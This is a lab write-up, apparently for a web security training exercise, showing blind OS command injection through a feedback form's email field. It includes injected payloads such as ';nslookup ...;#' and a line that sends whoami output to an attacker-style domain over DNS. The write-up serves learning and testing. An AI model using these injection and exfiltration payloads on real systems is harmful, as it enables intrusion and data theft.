# Blind OS command injection with out-of-band data exfiltration

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3cf01424-4157-4060-9e62-40874da27ca0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666XPYO4PP%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215559Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFzQ3bhE50V%2F12EiCs%2Bp0RkzFSFzvTlUz5QhQu3lpvkAAiBJOWCgWOR7GAUTAP11GIzl5ompgzyiGgqCVN5hs9E1ECqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMu7mRI6qHqJ56lH3SKtwD7O9iCicAuSTPndYgnKBQPyRHVXiSG%2BFDJLLsfkRmJghXzmScDKsol%2BKiYaXZIeiXDMJAaLqhpbhLz%2B2HIu00IsJyjfZTEVMGtIT8Qj6VszI1938SnE4yuoqN1okFiArP65%2FFw0xlGsrUUXYeW9waHc2Q4AErw0TpIX9vSsV1cZ3Ksumjkb%2FnzbASmqIJBLec2kKqO%2BVBlUek7LAh7qqkjIPV4UG422eQIzGPv4x%2BQ%2FfEuuJsVfCMFhXTfkRs3MPfD9QXz%2Btp8V1T0LfBipBSWRHQ9PMXLm2DmPbQUxqhNinEEvqJX3K9aq24hsZWen0rVdbAgRDK%2Ba6DY7s%2BRFX2YofxMkP2V2F3nx%2FkraxoXNR1YODnNXImwRH46h8tzNhvPnFnJ0%2B6WMxK4pftCoKeXuEnd9KP7tC01u3wC9ldKO4KO8I3Cxu3HwrmiZC5KWC0978i7MR3kVeMMTxBNUSkbFLYbSGws3BFh4P95aboWzvZe7Wi2CI28cUKJ3%2FaESaCqpmP9enFVyH1%2FyQUfcq4PSycwLVxXNb2yjnv%2FO33VXURawIew5hpMOkUVTn1tG5rm28axHpWP23AhOmBdSPaSEIOlj8KgPsh27eh7AYqeehIUREhM6yFQrQjMj4w7Iaj1AY6pgFs%2BwhzL7rPlpyawpS%2BRI6F5OP7BAhPRa19%2Fv3GdzTaVQIt9nEKmiHVNeqiLHxBrMBOdyEj240Jx%2BUBXbpBr4LPFAh31%2FWlbnDSzAgDKO2G1Pal6ypeQIpNQXcrzemuhRCEm1JVLtm9BqoqLypJGyiVP1LqVL0xjJf4M5Jvnindd7WdhpPoR9rGxODwGSiXgcg6yesKTEe9noBN4qa33Vm1pPV3FLr6&X-Amz-Signature=699199abe35cededa19ceb37b6be4a94fcaea3cf2f71fd3b71467d098452afd5&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup 8mvkjln6evqts94q7vwt31eziqoic90y.oastify.com;#
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/920c3740-dd8c-4461-923c-60ef01a5914b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666XPYO4PP%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215559Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFzQ3bhE50V%2F12EiCs%2Bp0RkzFSFzvTlUz5QhQu3lpvkAAiBJOWCgWOR7GAUTAP11GIzl5ompgzyiGgqCVN5hs9E1ECqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMu7mRI6qHqJ56lH3SKtwD7O9iCicAuSTPndYgnKBQPyRHVXiSG%2BFDJLLsfkRmJghXzmScDKsol%2BKiYaXZIeiXDMJAaLqhpbhLz%2B2HIu00IsJyjfZTEVMGtIT8Qj6VszI1938SnE4yuoqN1okFiArP65%2FFw0xlGsrUUXYeW9waHc2Q4AErw0TpIX9vSsV1cZ3Ksumjkb%2FnzbASmqIJBLec2kKqO%2BVBlUek7LAh7qqkjIPV4UG422eQIzGPv4x%2BQ%2FfEuuJsVfCMFhXTfkRs3MPfD9QXz%2Btp8V1T0LfBipBSWRHQ9PMXLm2DmPbQUxqhNinEEvqJX3K9aq24hsZWen0rVdbAgRDK%2Ba6DY7s%2BRFX2YofxMkP2V2F3nx%2FkraxoXNR1YODnNXImwRH46h8tzNhvPnFnJ0%2B6WMxK4pftCoKeXuEnd9KP7tC01u3wC9ldKO4KO8I3Cxu3HwrmiZC5KWC0978i7MR3kVeMMTxBNUSkbFLYbSGws3BFh4P95aboWzvZe7Wi2CI28cUKJ3%2FaESaCqpmP9enFVyH1%2FyQUfcq4PSycwLVxXNb2yjnv%2FO33VXURawIew5hpMOkUVTn1tG5rm28axHpWP23AhOmBdSPaSEIOlj8KgPsh27eh7AYqeehIUREhM6yFQrQjMj4w7Iaj1AY6pgFs%2BwhzL7rPlpyawpS%2BRI6F5OP7BAhPRa19%2Fv3GdzTaVQIt9nEKmiHVNeqiLHxBrMBOdyEj240Jx%2BUBXbpBr4LPFAh31%2FWlbnDSzAgDKO2G1Pal6ypeQIpNQXcrzemuhRCEm1JVLtm9BqoqLypJGyiVP1LqVL0xjJf4M5Jvnindd7WdhpPoR9rGxODwGSiXgcg6yesKTEe9noBN4qa33Vm1pPV3FLr6&X-Amz-Signature=abb12237618cccbbf409c60cc92580daa4952e40a420c5f96651bd3812815fc0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

Once we’ve confirmed blind OS command injection, we can exfiltrate the output from injected commands using OAST techniques:

> 💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

Add the output of `whoami` as subdomain to the domain name provided but Burp Collaborator and send the request. URLencode the payload to avoid breaking the request.

```bash
; nslookup `whoami`.8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
or
; nslookup $(whoami).8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0ede8f97-e945-4d3d-a9af-76c2069b3801/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666XPYO4PP%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215559Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFzQ3bhE50V%2F12EiCs%2Bp0RkzFSFzvTlUz5QhQu3lpvkAAiBJOWCgWOR7GAUTAP11GIzl5ompgzyiGgqCVN5hs9E1ECqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMu7mRI6qHqJ56lH3SKtwD7O9iCicAuSTPndYgnKBQPyRHVXiSG%2BFDJLLsfkRmJghXzmScDKsol%2BKiYaXZIeiXDMJAaLqhpbhLz%2B2HIu00IsJyjfZTEVMGtIT8Qj6VszI1938SnE4yuoqN1okFiArP65%2FFw0xlGsrUUXYeW9waHc2Q4AErw0TpIX9vSsV1cZ3Ksumjkb%2FnzbASmqIJBLec2kKqO%2BVBlUek7LAh7qqkjIPV4UG422eQIzGPv4x%2BQ%2FfEuuJsVfCMFhXTfkRs3MPfD9QXz%2Btp8V1T0LfBipBSWRHQ9PMXLm2DmPbQUxqhNinEEvqJX3K9aq24hsZWen0rVdbAgRDK%2Ba6DY7s%2BRFX2YofxMkP2V2F3nx%2FkraxoXNR1YODnNXImwRH46h8tzNhvPnFnJ0%2B6WMxK4pftCoKeXuEnd9KP7tC01u3wC9ldKO4KO8I3Cxu3HwrmiZC5KWC0978i7MR3kVeMMTxBNUSkbFLYbSGws3BFh4P95aboWzvZe7Wi2CI28cUKJ3%2FaESaCqpmP9enFVyH1%2FyQUfcq4PSycwLVxXNb2yjnv%2FO33VXURawIew5hpMOkUVTn1tG5rm28axHpWP23AhOmBdSPaSEIOlj8KgPsh27eh7AYqeehIUREhM6yFQrQjMj4w7Iaj1AY6pgFs%2BwhzL7rPlpyawpS%2BRI6F5OP7BAhPRa19%2Fv3GdzTaVQIt9nEKmiHVNeqiLHxBrMBOdyEj240Jx%2BUBXbpBr4LPFAh31%2FWlbnDSzAgDKO2G1Pal6ypeQIpNQXcrzemuhRCEm1JVLtm9BqoqLypJGyiVP1LqVL0xjJf4M5Jvnindd7WdhpPoR9rGxODwGSiXgcg6yesKTEe9noBN4qa33Vm1pPV3FLr6&X-Amz-Signature=5b6c6962131cef01f6ed9a95a9bdaa17565ba539a09c952afb3104aaf5c9e44e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

The username is shown in the DNS request:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/91b1cdca-b79b-4600-b61a-bbb70e358201/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666XPYO4PP%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215559Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFzQ3bhE50V%2F12EiCs%2Bp0RkzFSFzvTlUz5QhQu3lpvkAAiBJOWCgWOR7GAUTAP11GIzl5ompgzyiGgqCVN5hs9E1ECqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMu7mRI6qHqJ56lH3SKtwD7O9iCicAuSTPndYgnKBQPyRHVXiSG%2BFDJLLsfkRmJghXzmScDKsol%2BKiYaXZIeiXDMJAaLqhpbhLz%2B2HIu00IsJyjfZTEVMGtIT8Qj6VszI1938SnE4yuoqN1okFiArP65%2FFw0xlGsrUUXYeW9waHc2Q4AErw0TpIX9vSsV1cZ3Ksumjkb%2FnzbASmqIJBLec2kKqO%2BVBlUek7LAh7qqkjIPV4UG422eQIzGPv4x%2BQ%2FfEuuJsVfCMFhXTfkRs3MPfD9QXz%2Btp8V1T0LfBipBSWRHQ9PMXLm2DmPbQUxqhNinEEvqJX3K9aq24hsZWen0rVdbAgRDK%2Ba6DY7s%2BRFX2YofxMkP2V2F3nx%2FkraxoXNR1YODnNXImwRH46h8tzNhvPnFnJ0%2B6WMxK4pftCoKeXuEnd9KP7tC01u3wC9ldKO4KO8I3Cxu3HwrmiZC5KWC0978i7MR3kVeMMTxBNUSkbFLYbSGws3BFh4P95aboWzvZe7Wi2CI28cUKJ3%2FaESaCqpmP9enFVyH1%2FyQUfcq4PSycwLVxXNb2yjnv%2FO33VXURawIew5hpMOkUVTn1tG5rm28axHpWP23AhOmBdSPaSEIOlj8KgPsh27eh7AYqeehIUREhM6yFQrQjMj4w7Iaj1AY6pgFs%2BwhzL7rPlpyawpS%2BRI6F5OP7BAhPRa19%2Fv3GdzTaVQIt9nEKmiHVNeqiLHxBrMBOdyEj240Jx%2BUBXbpBr4LPFAh31%2FWlbnDSzAgDKO2G1Pal6ypeQIpNQXcrzemuhRCEm1JVLtm9BqoqLypJGyiVP1LqVL0xjJf4M5Jvnindd7WdhpPoR9rGxODwGSiXgcg6yesKTEe9noBN4qa33Vm1pPV3FLr6&X-Amz-Signature=a77943dd99248833e3c9ddee1502d2dfdf78537e08a8b92c2f54d8993858b4da&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
